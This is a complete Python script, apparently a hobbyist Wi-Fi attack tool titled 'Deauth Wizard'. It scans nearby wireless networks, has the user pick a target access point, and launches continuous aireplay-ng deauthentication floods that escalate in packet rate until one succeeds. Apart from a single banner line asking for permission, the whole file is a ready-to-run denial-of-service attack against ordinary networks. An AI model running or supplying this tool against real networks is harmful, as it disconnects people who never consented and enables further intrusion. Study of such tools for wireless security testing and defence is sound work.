#!/usr/bin/env python3

import os
import sys
import time
import signal
import subprocess
import logging
import select
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

# Global attack process variable
ATTACK_PROCESS: Optional[subprocess.Popen] = None
ATTACK_RUNNING = False


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def print_header(title: str, subtitle: Optional[str] = None) -> None:
    logging.info(color_text(title, COLOR_HEADER))
    if subtitle:
        logging.info(subtitle)
    logging.info("")


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def get_interface_mode(interface: str) -> Optional[str]:
    result = subprocess.run(
        ["iw", "dev", interface, "info"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if line.startswith("type "):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return None


def is_monitor_mode(interface: str) -> bool:
    return get_interface_mode(interface) == "monitor"


def set_interface_type(interface: str, mode: str) -> bool:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        result = subprocess.run(
            ["iw", "dev", interface, "set", "type", mode],
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        if result.returncode != 0:
            logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
            return False
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        return True
    except Exception as exc:
        logging.error("Failed to set %s mode: %s", mode, exc)
        return False


def restore_managed_mode(interface: str) -> None:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def freq_to_channel(freq: float) -> Optional[int]:
    if 2412 <= freq <= 2472:
        return int((freq - 2407) // 5)
    if freq == 2484:
        return 14
    if 5000 <= freq <= 5825:
        return int((freq - 5000) // 5)
    return None


def parse_channel_value(text: str) -> Optional[int]:
    try:
        return int(text)
    except (TypeError, ValueError):
        return None


def parse_freq_value(text: str) -> Optional[float]:
    try:
        value = float(text)
    except (TypeError, ValueError):
        return None
    if value > 100000:
        value /= 1000.0
    return value


def scan_wireless_networks(
    interface: str,
    duration_seconds: int = 15,
    show_progress: bool = False,
) -> List[Dict[str, Optional[str]]]:
    def run_scan() -> subprocess.CompletedProcess:
        return subprocess.run(
            ["iw", "dev", interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )

    end_time = time.time() + max(1, duration_seconds)
    networks: Dict[str, Dict[str, Optional[str]]] = {}
    last_remaining = None
    while time.time() < end_time:
        if show_progress and COLOR_ENABLED:
            remaining = max(0, int(end_time - time.time()))
            if remaining != last_remaining:
                last_remaining = remaining
                message = (
                    f"{style('Scanning', STYLE_BOLD)}... "
                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
                )
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
        try:
            result = run_scan()
        except FileNotFoundError:
            logging.error("Required tool 'iw' not found!")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        if result.returncode != 0 and is_monitor_mode(interface):
            if set_interface_type(interface, "managed"):
                result = run_scan()
                if not set_interface_type(interface, "monitor"):
                    logging.error("Failed to restore monitor mode after scan.")

        if result.returncode != 0:
            logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        current: Dict[str, Optional[str]] = {}
        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("BSS "):
                if current.get("bssid") and current.get("ssid"):
                    existing = networks.get(current["bssid"])
                    if existing is None or (
                        current.get("signal") is not None
                        and (existing.get("signal") is None or current["signal"] > existing["signal"])
                    ):
                        networks[current["bssid"]] = current
                current = {"bssid": line.split()[1].split("(")[0], "ssid": None, "signal": None, "channel": None}
                continue
            if line.startswith("freq:"):
                parts = line.split()
                freq_val = parse_freq_value(parts[1]) if len(parts) > 1 else None
                current["channel"] = freq_to_channel(freq_val) if freq_val is not None else None
                continue
            if line.startswith("DS Parameter set:"):
                parts = line.split()
                if len(parts) >= 4 and parts[-2] == "channel":
                    channel_val = parse_channel_value(parts[-1])
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("* primary channel:"):
                parts = line.split(":")
                if len(parts) == 2:
                    channel_val = parse_channel_value(parts[1].strip())
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("signal:"):
                parts = line.split()
                try:
                    current["signal"] = float(parts[1])
                except (IndexError, ValueError):
                    current["signal"] = None
                continue
            if line.startswith("SSID:"):
                ssid_val = line.split(":", 1)[1].strip()
                current["ssid"] = ssid_val if ssid_val else "<hidden>"

        if current.get("bssid") and current.get("ssid"):
            existing = networks.get(current["bssid"])
            if existing is None or (
                current.get("signal") is not None
                and (existing.get("signal") is None or current["signal"] > existing["signal"])
            ):
                networks[current["bssid"]] = current

        time.sleep(0.2)

    if show_progress and COLOR_ENABLED:
        sys.stdout.write("\n")

    sorted_networks = sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )
    return sorted_networks


def select_network(attack_interface: str, duration_seconds: int) -> Dict[str, Optional[str]]:
    while True:
        networks = scan_wireless_networks(attack_interface, duration_seconds, show_progress=True)
        if not networks:
            logging.warning("No networks found during scan.")
            retry = input(f"{style('Rescan', STYLE_BOLD)}? (Y/N): ").strip().lower()
            if retry == "y":
                continue
            sys.exit(1)

        logging.info("")
        logging.info(style("Available networks:", STYLE_BOLD))
        for index, net in enumerate(networks, start=1):
            signal = f"{net['signal']:.1f} dBm" if net["signal"] is not None else "signal unknown"
            channel = f"ch {net['channel']}" if net["channel"] else "ch ?"
            label = f"{index}) {net['ssid']} ({net['bssid']}) -"
            logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)

        choice = input(
            f"{style('Select network', STYLE_BOLD)} (number, or R to rescan): "
        ).strip().lower()
        if choice == "r":
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                return networks[idx - 1]
        logging.warning("Invalid selection. Try again.")


SELECTED_INTERFACE: Optional[str] = None


def cleanup() -> None:
    if SELECTED_INTERFACE:
        restore_managed_mode(SELECTED_INTERFACE)
    stop_attack()


def verify_channel(interface: str, expected_channel: int) -> bool:
    """Weryfikuje czy interfejs jest na poprawnym kanale"""
    result = subprocess.run(
        ["iw", "dev", interface, "info"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    
    if result.returncode != 0:
        return False
    
    for line in result.stdout.splitlines():
        line = line.strip()
        if "channel" in line.lower():
            if str(expected_channel) in line:
                return True
            # Sprawdź częstotliwość
            if "freq" in line.lower():
                try:
                    freq = float(line.split()[1])
                    from_freq = freq_to_channel(freq)
                    return from_freq == expected_channel
                except:
                    pass
    return False


def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
    global ATTACK_PROCESS, ATTACK_RUNNING
    bssid = target["bssid"]
    channel = target["channel"]
    
    if not bssid:
        logging.error("Missing target BSSID; cannot start attack.")
        return False

    # 1. TEST INJECTION
    logging.info("\n" + "="*50)
    logging.info(style("STEP 1: Testing packet injection", STYLE_BOLD))
    logging.info("="*50)
    
    test_result = subprocess.run(
        ["aireplay-ng", "--test", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=10,
    )
    
    if test_result.returncode != 0:
        logging.error(color_text("✗ aireplay-ng test failed!", COLOR_ERROR))
        logging.error("Error: %s", test_result.stderr[:200])
        return False
    
    if "Injection is working!" not in test_result.stdout:
        logging.warning(color_text("⚠ Packet injection may not work", COLOR_WARNING))
        # Spróbujmy i tak
    else:
        logging.info(color_text("✓ Packet injection working", COLOR_SUCCESS))
    
    # 2. USTAW KANAŁ I WERYFIKUJ
    if channel:
        logging.info("\n" + "="*50)
        logging.info(style(f"STEP 2: Setting channel {channel}", STYLE_BOLD))
        logging.info("="*50)
        
        # Zatrzymaj interfejs przed zmianą kanału
        subprocess.run(["ip", "link", "set", interface, "down"], 
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(0.5)
        
        # Ustaw kanał
        for attempt in range(3):
            channel_result = subprocess.run(
                ["iw", "dev", interface, "set", "channel", str(channel)],
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE,
                text=True,
            )
            
            if channel_result.returncode == 0:
                logging.info(f"✓ Channel {channel} set (attempt {attempt+1})")
                break
            else:
                logging.warning(f"Attempt {attempt+1} failed: {channel_result.stderr.strip()}")
                time.sleep(1)
        
        # Włącz interfejs
        subprocess.run(["ip", "link", "set", interface, "up"],
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(1)
        
        # WERYFIKUJ kanał
        if verify_channel(interface, channel):
            logging.info(color_text(f"✓ Verified: on channel {channel}", COLOR_SUCCESS))
        else:
            logging.error(color_text(f"✗ FAILED to set channel {channel}!", COLOR_ERROR))
            logging.info("Trying to auto-detect channel...")
            # Spróbuj bez konkretnego kanału
    
    # 3. SPRAWDŹ CZY WIDZISZ CEL
    logging.info("\n" + "="*50)
    logging.info(style("STEP 3: Verifying target visibility", STYLE_BOLD))
    logging.info("="*50)
    
    target_found = False
    for scan_attempt in range(3):
        logging.info(f"Scan attempt {scan_attempt + 1}/3...")
        scan_result = subprocess.run(
            ["iw", "dev", interface, "scan", "duration", "2"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=5,
        )
        
        if scan_result.returncode == 0:
            for line in scan_result.stdout.splitlines():
                if bssid.lower() in line.lower():
                    target_found = True
                    # Znajdź kanał w output
                    if "freq:" in line or "channel" in line:
                        logging.info(f"Target found: {line.strip()}")
                    break
        
        if target_found:
            logging.info(color_text(f"✓ Target {bssid} is visible", COLOR_SUCCESS))
            break
        else:
            logging.warning(f"Target not found in scan {scan_attempt + 1}")
            time.sleep(1)
    
    if not target_found:
        logging.error(color_text("✗ Target not visible!", COLOR_ERROR))
        logging.info("Possible reasons:")
        logging.info("  1. Wrong channel (router may have changed)")
        logging.info("  2. Too far from target")
        logging.info("  3. Interface not in monitor mode")
        
        # Sprawdź tryb interfejsu
        if not is_monitor_mode(interface):
            logging.error("Interface is NOT in monitor mode!")
            if not set_interface_type(interface, "monitor"):
                return False
        
        proceed = input("Try attack anyway? (y/n): ").strip().lower()
        if proceed != 'y':
            return False
    
    # 4. URUCHOM ATAK - AGGRESYWNA WERSJA
    logging.info("\n" + "="*50)
    logging.info(style("STEP 4: Starting attack", STYLE_BOLD))
    logging.info("="*50)
    
    # PRÓBUJ RÓŻNE METODY
    methods = [
        {
            "name": "Continuous attack (standard)",
            "cmd": ["aireplay-ng", "-0", "0", "-a", bssid, interface]
        },
        {
            "name": "Fast attack (1000 packets)",
            "cmd": ["aireplay-ng", "-0", "1000", "-a", bssid, interface]
        },
        {
            "name": "Aggressive attack (500 packets, fast)",
            "cmd": ["aireplay-ng", "-0", "500", "-a", bssid, "-x", "256", interface]
        },
        {
            "name": "Very aggressive (200 packets, very fast)",
            "cmd": ["aireplay-ng", "-0", "200", "-a", bssid, "-x", "512", interface]
        }
    ]
    
    for method_idx, method in enumerate(methods):
        logging.info(f"\nTrying: {method['name']}")
        
        if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
            stop_attack()
            time.sleep(2)
        
        try:
            # Uruchom aireplay-ng
            ATTACK_PROCESS = subprocess.Popen(
                method["cmd"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
                preexec_fn=os.setsid,
            )
            
            # Poczekaj na inicjalizację
            time.sleep(3)
            
            # Sprawdź czy proces żyje
            if ATTACK_PROCESS.poll() is not None:
                stderr_output = ""
                try:
                    stderr_output = ATTACK_PROCESS.stderr.read()
                except:
                    pass
                
                logging.warning(f"Process exited: {stderr_output[:200]}")
                continue
            
            # Przeczytaj początkowy output
            for _ in range(5):
                ready, _, _ = select.select([ATTACK_PROCESS.stdout, ATTACK_PROCESS.stderr], [], [], 0.1)
                
                for stream in ready:
                    try:
                        line = stream.readline()
                        if line:
                            line = line.strip()
                            if "sending" in line.lower() or "packet" in line.lower():
                                logging.info(color_text(f"  → {line}", COLOR_HIGHLIGHT))
                            elif "error" in line.lower() or "fail" in line.lower():
                                logging.warning(f"  ⚠ {line}")
                            else:
                                logging.debug(f"  {line}")
                    except:
                        pass
                
                if ATTACK_PROCESS.poll() is not None:
                    break
            
            # Jeśli proces nadal działa, uznaj za sukces
            if ATTACK_PROCESS.poll() is None:
                logging.info(color_text(f"✓ Attack running ({method['name']})", COLOR_SUCCESS))
                logging.info(f"PID: {ATTACK_PROCESS.pid}")
                
                # Pobierz statystyki
                try:
                    stats = subprocess.run(
                        ["iw", interface, "station", "dump"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.DEVNULL,
                        text=True,
                    )
                    if stats.returncode == 0:
                        logging.debug("Interface stats available")
                except:
                    pass
                
                ATTACK_RUNNING = True
                return True
                
        except Exception as exc:
            logging.error(f"Error with {method['name']}: {exc}")
            continue
    
    logging.error(color_text("✗ All attack methods failed!", COLOR_ERROR))
    return False


def stop_attack() -> None:
    global ATTACK_PROCESS, ATTACK_RUNNING
    if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
        logging.info("Stopping deauth attack...")
        try:
            try:
                pgid = os.getpgid(ATTACK_PROCESS.pid)
            except Exception:
                pgid = None
            
            if pgid is not None:
                try:
                    os.killpg(pgid, signal.SIGTERM)
                except Exception:
                    ATTACK_PROCESS.terminate()
            else:
                ATTACK_PROCESS.terminate()
            
            try:
                ATTACK_PROCESS.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    if pgid is not None:
                        os.killpg(pgid, signal.SIGKILL)
                    else:
                        ATTACK_PROCESS.kill()
                    ATTACK_PROCESS.wait(timeout=2)
                except Exception:
                    pass
        except Exception as e:
            logging.warning("Error while stopping attack: %s", e)
        
        try:
            for _ in range(10):
                if ATTACK_PROCESS.poll() is not None:
                    break
                time.sleep(0.5)
        except Exception:
            pass
    
    ATTACK_PROCESS = None
    ATTACK_RUNNING = False


def monitor_attack() -> None:
    """Monitoruje proces ataku i informuje jeśli się zakończył nieoczekiwanie"""
    global ATTACK_RUNNING
    
    check_count = 0
    while ATTACK_RUNNING:
        time.sleep(3)
        check_count += 1
        
        if ATTACK_PROCESS is None:
            break
            
        if ATTACK_PROCESS.poll() is not None:
            logging.error("\n%s Attack process terminated unexpectedly!", color_text("✗", COLOR_ERROR))
            try:
                if ATTACK_PROCESS.stderr:
                    stderr_content = ATTACK_PROCESS.stderr.read()
                    if stderr_content:
                        logging.error("Error output: %s", stderr_content[:500])
            except:
                pass
            ATTACK_RUNNING = False
            break
        
        # Co 30 sekund wyświetl informację
        if check_count % 10 == 0 and ATTACK_RUNNING:
            logging.info("%s Attack still running... %s", 
                        color_text("→", COLOR_HIGHLIGHT),
                        time.strftime("%H:%M:%S"))
            
            # Spróbuj pobrać jakieś dane z procesu
            try:
                if ATTACK_PROCESS.stdout:
                    ready, _, _ = select.select([ATTACK_PROCESS.stdout], [], [], 0.1)
                    if ready:
                        line = ATTACK_PROCESS.stdout.readline()
                        if line and ("sent" in line.lower() or "packet" in line.lower()):
                            logging.info("  %s", line.strip())
            except:
                pass


def run_deauth_session() -> bool:
    global SELECTED_INTERFACE, ATTACK_RUNNING

    interfaces = list_network_interfaces()
    SELECTED_INTERFACE = select_interface(interfaces)

    logging.info("")
    input(f"{style('Press Enter', STYLE_BOLD)} to switch {SELECTED_INTERFACE} to monitor mode...")
    if not set_interface_type(SELECTED_INTERFACE, "monitor"):
        return False
    logging.info(color_text("✓ Monitor mode confirmed", COLOR_SUCCESS))

    logging.info("")
    scan_seconds = prompt_int(
        f"{style('Scan duration', STYLE_BOLD)} in seconds "
        f"({style('Enter', STYLE_BOLD)} for {style('15', COLOR_SUCCESS, STYLE_BOLD)}): ",
        default=15,
    )

    logging.info("")
    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {SELECTED_INTERFACE}...")
    target_network = select_network(SELECTED_INTERFACE, scan_seconds)
    logging.info("")
    logging.info(
        "Target selected: %s (%s) on channel %s",
        style(target_network["ssid"], COLOR_SUCCESS, STYLE_BOLD),
        target_network["bssid"],
        style(str(target_network["channel"]), COLOR_HIGHLIGHT) if target_network["channel"] else "unknown"
    )

    if not is_monitor_mode(SELECTED_INTERFACE):
        logging.warning("Interface left monitor mode; re-enabling.")
        if not set_interface_type(SELECTED_INTERFACE, "monitor"):
            return False

    logging.info("")
    logging.info(style("="*60, STYLE_BOLD))
    logging.info(style("STARTING DEAUTHENTICATION ATTACK", COLOR_WARNING, STYLE_BOLD))
    logging.info(style("="*60, STYLE_BOLD))
    
    if not start_deauth_attack(SELECTED_INTERFACE, target_network):
        logging.error(color_text("Attack failed to start!", COLOR_ERROR))
        return False
    
    logging.info("")
    logging.info(style("ATTACK STATUS:", STYLE_BOLD))
    logging.info("✓ Attack is running")
    logging.info("✓ Sending deauth packets continuously")
    logging.info("✓ Monitor active")
    logging.info("")
    logging.info(style("Note:", COLOR_WARNING))
    logging.info("Some modern routers/devices may be resistant to deauth attacks.")
    logging.info("If devices don't disconnect, they may have protection (WPA3/802.11w).")
    logging.info("")
    logging.info(style("CONTROLS:", STYLE_BOLD))
    logging.info("  [S] - Stop and select new interface")
    logging.info("  [B] - Stop and return to main menu")
    logging.info("  [R] - Stop and scan for new target")
    logging.info("  [Ctrl+C] - Emergency stop")
    logging.info("")
    
    # Uruchom wątek monitorujący
    import threading
    monitor_thread = threading.Thread(target=monitor_attack, daemon=True)
    monitor_thread.start()
    
    try:
        while ATTACK_RUNNING:
            try:
                choice = input(
                    f"{style('Enter option', STYLE_BOLD)} (S/B/R): "
                ).strip().lower()
                
                if choice in {"s", "stop"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    logging.info("Returning to interface selection...")
                    logging.info("")
                    return True
                elif choice in {"b", "back"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    return False
                elif choice in {"r", "restart"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    logging.info("Restarting from network scan...")
                    logging.info("")
                    return True
                else:
                    logging.warning("Please enter S, B, or R.")
            except KeyboardInterrupt:
                logging.info("\n")
                confirm = input(f"{style('Really stop attack?', STYLE_BOLD)} (Y/N): ").strip().lower()
                if confirm in {"y", "yes"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped by user", COLOR_SUCCESS))
                    logging.info("")
                    break
                else:
                    logging.info("Continuing attack...")
                    continue
    except Exception as e:
        logging.error("Unexpected error: %s", e)
        stop_attack()
    
    return False


def main() -> None:
    print_header("DEAUTH WIZARD v2.0", "Advanced Wi-Fi Deauthentication Attack Tool")
    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
    logging.info("Use only on networks you own or have explicit permission to test!")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    required_tools = ["iw", "ip", "ethtool", "aireplay-ng"]
    missing_tools = []
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        logging.error("Missing required tools: %s", ", ".join(missing_tools))
        logging.info("Install with: sudo apt install wireless-tools net-tools ethtool aircrack-ng")
        sys.exit(1)

    import atexit
    atexit.register(cleanup)

    while True:
        restart = run_deauth_session()
        if not restart:
            logging.info(color_text("Exiting Deauth Wizard.", COLOR_HEADER))
            break
        logging.info(color_text("\n" + "="*60, COLOR_HEADER))
        logging.info(color_text("RESTARTING DEAUTH WIZARD...", COLOR_HEADER, STYLE_BOLD))
        logging.info(color_text("="*60 + "\n", COLOR_HEADER))


if __name__ == "__main__":
    main()